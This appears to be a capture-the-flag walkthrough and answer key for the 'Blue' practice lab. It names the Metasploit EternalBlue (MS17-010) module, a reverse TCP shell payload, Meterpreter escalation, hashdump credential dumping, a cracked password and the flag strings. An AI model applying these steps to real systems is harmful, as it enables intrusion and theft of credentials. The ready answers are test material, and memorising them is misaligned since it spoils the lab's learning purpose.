# Blue

Difficulty: Easy

## Task 1 - Recon

- Scan the machine!

          no answer needed

- How many ports are open with a port number under 1000?

	- `3`

- What is this machine vulnerable to?

	- `ms17-010`

## Task 2 - Gain Access

- Start Metasploit

          no answer needed

- Find the exploitation code we will run against the machine. What is the full path of the code?

	- `exploit/windows/smb/ms17_010_eternalblue`

- Show options and set the one required value. What is the name of this value?

	- `RHOSTS`

- Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`

          no answer needed

- With that done, run the exploit!

          no answer needed

- Confirm that the exploit has run correctly.

          no answer needed

## Task 3 - Escalate

- What is the name of the post module we will use?

	- `post/multi/manage/shell_to_meterpreter`

- Select this (use MODULE_PATH). Show options, what option are we required to change?

	- `SESSION`

- Set the required option

          no answer needed

- Run! If this doesn't work, try completing the exploit from the previous task once more.

          no answer needed

- Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this.

          no answer needed

- List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

          no answer needed

- Migrate to this process using the 'migrate PROCESS_ID' command whre the process id is the one you just wrote down in the previous step.

          no answer needed

- Within our elevate meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. what is the name of the non-default user?

	- `Jon`

- Copy this password hash to a file and research how to crack it. What is the cracked password?

	- `alqfna22`

## Task 4 - Find flags!

- Flag 1? *This flag can be found at the system root.*

	- `flag{access_the_machine}`

- Flag 2? *This flag can be found at the location where passwords are stored within Windows.*

	- `flag{sam_database_elevated_access}`

- Flag 3? *This flag can be found in an excellent location to loot. After all Administrators usually have pretty interesting things saved.*

	- `flag{admin_documents_can_be_valuable}`
